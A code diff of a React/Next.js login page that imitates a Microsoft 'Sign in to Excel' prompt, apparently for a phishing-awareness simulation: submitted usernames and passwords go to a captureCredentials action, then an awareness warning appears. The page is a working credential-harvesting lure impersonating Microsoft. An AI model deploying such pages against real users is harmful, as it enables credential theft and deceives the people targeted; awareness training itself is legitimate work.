@@ -4,10 +4,7 @@ import React, { FormEvent, useState, useEffect } from 'react';
 import Image from 'next/image';
 import { useSearchParams } from 'next/navigation';
 import { ShieldX, AlertTriangle } from 'lucide-react';
-
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-import { Input } from '@/components/ui/input';
-import { Button } from '@/components/ui/button';
+import { captureCredentials } from '@/app/actions/capture-credentials';
 import {
   AlertDialog,
   AlertDialogAction,
@@ -17,8 +14,6 @@ import {
   AlertDialogHeader,
   AlertDialogTitle,
 } from '@/components/ui/alert-dialog';
-import { PlaceHolderImages } from '@/lib/placeholder-images';
-import { captureCredentials } from '@/ai/flows/capture-credentials';
 
 export default function LoginPageClient() {
   const [username, setUsername] = useState('');
@@ -30,7 +25,6 @@ export default function LoginPageClient() {
   const [fileName, setFileName] = useState('');
 
   const searchParams = useSearchParams();
-  const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');
 
   useEffect(() => {
     const file = searchParams.get('file');
@@ -67,77 +61,106 @@ export default function LoginPageClient() {
   };
 
   return (
-    <div className="relative flex items-center justify-center min-h-screen">
-      {/* Background Image */}
-      {bgImage && (
+    <>
+      <style jsx global>{`
+        body {
+          margin: 0;
+          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          background: url('https://cdn.prod.website-files.com/6777c60fe010fa2ddf45acdc/6777c610e010fa2ddf45c003_66dff0614b40e5182f648c30_886300bf.jpeg') no-repeat center center fixed;
+          background-size: cover;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          height: 100vh;
+        }
+        .card {
+          background-color: white;
+          padding: 2rem;
+          border-radius: 12px;
+          width: 380px;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+          text-align: center;
+        }
+        .card img {
+          max-width: 180px;
+          margin-bottom: 1rem;
+        }
+        .card h1 {
+          color: #0078D4;
+          font-size: 1.5rem;
+          margin-bottom: 1.5rem;
+        }
+        input[type="text"],
+        input[type="password"] {
+            box-sizing: border-box;
+            width: 100%;
+            padding: 0.8rem;
+            margin-bottom: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            background-color: #0078D4;
+            color: white;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        button:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 1rem;
+            font-size: 0.75rem;
+            color: #555;
+        }
+      `}</style>
+      
+      <div className="card">
         <Image
-          src={bgImage.imageUrl}
-          alt={bgImage.description}
-          fill
-          priority
-          style={{ objectFit: 'cover' }}
-          className="pointer-events-none"
-          data-ai-hint={bgImage.imageHint}
+          src="https://trellissoft.ai/wp-content/uploads/2021/11/Trellissoft-logo-without-tagline.png"
+          alt="Trellissoft Logo"
+          width={180}
+          height={36}
         />
-      )}
-
-      {/* Login Card */}
-      <Card className="w-[380px] bg-white text-center shadow-2xl z-10">
-        <CardHeader>
-          <div className="flex justify-center mb-4">
-            <Image
-              src="https://trellissoft.ai/wp-content/uploads/2021/11/Trellissoft-logo-without-tagline.png"
-              alt="Trellissoft Logo"
-              width={180}
-              height={40}
-              className="object-contain"
-              priority
-            />
-          </div>
-          <CardTitle className="text-2xl font-semibold text-[#0078D4]">
-            {fileName ? `Sign in to open ${fileName}` : 'Sign in to Excel'}
-          </CardTitle>
-        </CardHeader>
-
-        <CardContent>
-          <form onSubmit={handleSubmit} autoComplete="off" className="space-y-4">
-            <Input
-              type="text"
-              name="username"
-              placeholder="Email or phone"
-              required
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              className="w-full p-3 border-gray-300 rounded-md text-base"
-              disabled={isLoading}
-            />
-
-            <Input
-              type="password"
-              name="password"
-              placeholder="Password"
-              required
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="w-full p-3 border-gray-300 rounded-md text-base"
-              disabled={isLoading}
-            />
-
-            <Button
-              type="submit"
-              className="w-full p-3 mt-2 bg-[#0078D4] text-white font-bold rounded-md hover:bg-blue-700 transition-colors"
-              disabled={isLoading}
-            >
-              {isLoading ? 'Signing in...' : 'Sign in'}
-            </Button>
-          </form>
-
-          <div className="mt-4 text-xs text-gray-600">
-            <p className="mb-2">This application is created using Microsoft 365 by Trellissoft and may include content controlled by Trellissoft.</p>
-            © Microsoft Corporation
-          </div>
-        </CardContent>
-      </Card>
+        <h1>{fileName ? `Sign in to open ${fileName}` : 'Sign in to Excel'}</h1>
+        <form onSubmit={handleSubmit} autoComplete="off">
+          <input
+            type="text"
+            name="username"
+            placeholder="Email or phone"
+            required
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            disabled={isLoading}
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            disabled={isLoading}
+          />
+          <button type="submit" disabled={isLoading}>
+            {isLoading ? 'Signing in...' : 'Sign in'}
+          </button>
+        </form>
+        <div className="footer">
+          <p>This application is created using Microsoft 365 by Trellissoft and may include content controlled by Trellissoft.</p>
+          <p>&copy; Microsoft Corporation</p>
+        </div>
+      </div>
 
       {/* Awareness Alert Dialog */}
       <AlertDialog open={showSuccessAlert} onOpenChange={setShowSuccessAlert}>
@@ -153,16 +176,13 @@ export default function LoginPageClient() {
                 priority
               />
             </div>
-
             <div className="flex justify-center mb-3">
               <ShieldX className="w-14 h-14 text-red-500" />
             </div>
-
             <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
               This Link Has Expired
             </AlertDialogTitle>
           </AlertDialogHeader>
-
           <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
             ⚠️ This link has expired for security reasons. <br />
             Your asset update form is no longer available. <br />
@@ -173,7 +193,6 @@ export default function LoginPageClient() {
               Always be cautious of unexpected login requests.
             </p>
           </AlertDialogDescription>
-
           <AlertDialogFooter className="sm:justify-center mt-4">
             <AlertDialogAction
               onClick={() => setShowSuccessAlert(false)}
@@ -209,6 +228,6 @@ export default function LoginPageClient() {
           </AlertDialogFooter>
         </AlertDialogContent>
       </AlertDialog>
-    </div>
+    </>
   );
 }
